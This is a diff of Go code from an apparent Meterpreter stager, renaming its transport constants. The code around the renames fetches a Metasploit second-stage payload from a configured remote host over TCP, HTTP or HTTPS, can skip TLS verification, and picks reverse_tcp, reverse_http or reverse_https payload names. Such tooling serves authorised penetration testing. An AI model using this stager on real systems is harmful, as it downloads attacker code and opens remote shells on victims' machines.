@@ -19,14 +19,14 @@ import (
 type Transport string
 
 const (
-	// TransportTCP uses TCP reverse connection.
-	TransportTCP Transport = "tcp"
+	// TCP uses TCP reverse connection.
+	TCP Transport = "tcp"
 
-	// TransportHTTP uses HTTP reverse connection.
-	TransportHTTP Transport = "http"
+	// HTTP uses HTTP reverse connection.
+	HTTP Transport = "http"
 
-	// TransportHTTPS uses HTTPS reverse connection.
-	TransportHTTPS Transport = "https"
+	// HTTPS uses HTTPS reverse connection.
+	HTTPS Transport = "https"
 )
 
 // Config contains configuration for Meterpreter staging.
@@ -107,9 +107,9 @@ func (s *Stager) Stage(ctx context.Context) error {
 // fetchStage retrieves the stage payload from Metasploit.
 func (s *Stager) fetchStage() ([]byte, error) {
 	switch s.config.Transport {
-	case TransportTCP:
+	case TCP:
 		return s.fetchStageTCP()
-	case TransportHTTP, TransportHTTPS:
+	case HTTP, HTTPS:
 		return s.fetchStageHTTP()
 	default:
 		return nil, fmt.Errorf("unsupported transport: %s", s.config.Transport)
@@ -156,14 +156,14 @@ func (s *Stager) fetchStageTCP() ([]byte, error) {
 // fetchStageHTTP retrieves the stage via HTTP/HTTPS.
 func (s *Stager) fetchStageHTTP() ([]byte, error) {
 	scheme := "http"
-	if s.config.Transport == TransportHTTPS {
+	if s.config.Transport == HTTPS {
 		scheme = "https"
 	}
 
 	url := fmt.Sprintf("%s://%s:%s/", scheme, s.config.Host, s.config.Port)
 
 	httpTransport := &http.Transport{}
-	if s.config.Transport == TransportHTTPS {
+	if s.config.Transport == HTTPS {
 		httpTransport.TLSClientConfig = &tls.Config{
 			InsecureSkipVerify: s.config.TLSInsecure,
 		}
@@ -245,11 +245,11 @@ func PayloadName(transport Transport) string {
 
 	var suffix string
 	switch transport {
-	case TransportTCP:
+	case TCP:
 		suffix = "reverse_tcp"
-	case TransportHTTP:
+	case HTTP:
 		suffix = "reverse_http"
-	case TransportHTTPS:
+	case HTTPS:
 		suffix = "reverse_https"
 	}
 
